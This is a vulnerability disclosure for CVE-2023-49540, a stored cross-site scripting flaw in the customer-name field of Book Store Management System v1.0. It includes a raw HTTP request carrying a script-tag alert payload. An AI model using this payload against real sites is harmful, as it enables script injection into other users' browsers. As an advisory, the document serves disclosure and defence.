# CVE-2023-49540
# Book Store Management System v1.0 -  Cross-site scripting (XSS) vulnerability in /index.php/history - vulnerable field: "Customer's Name".


**Description**: Book Store Management System v1.0 was discovered to contain a cross-site scripting (XSS) vulnerability in /bsms_ci/index.php/history. The payload is inserted into the 'Customer's Name' field on the /bsms_ci/index.php/transaction page. When we check the /bsms_ci/index.php/history page, our payload is successfully injected and functional.  

**Vulnerable Product Version**: Book Store Management System v1.0  
**CVE Author**: Geraldo Alcântara  
**Date**: 29/11/2023  
**Confirmed on**: 15/12/2023  
**CVE**: CVE-2023-49540  
**Tested on**: Windows  
### Steps to reproduce:  
To exploit this, the payload is inserted into the 'Customer's Name' field on the "/bsms_ci/index.php/transaction" page. Upon verification on the "/bsms_ci/index.php/history" page, it is confirmed that the payload has been successfully injected and is operational. 
### Request:

```
POST /bsms_ci/index.php/transaction/save HTTP/1.1
Host: 192.168.68.148
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://192.168.68.148
Connection: close
Referer: http://192.168.68.148/bsms_ci/index.php/transaction
Cookie: csrftoken=1hWW6JE5vLFhJv2y8LwgL3WNPbPJ3J2WAX9F2U0Fd5H5t6DSztkJWD4nWFrbF8ko; sessionid=xrn1sshbol1vipddxsijmgkdp2q4qdgq; ci_session=5e3p7a2j4a65ocjof08v80jugf17i5cd
Upgrade-Insecure-Requests: 1

user_code=2&buyer_name=1200%3cscript%3ealert(1)%3c%2fscript%3e&total=0&pay=Pay
```
Discoverer(s)/Credits:  
Geraldo Alcântara  
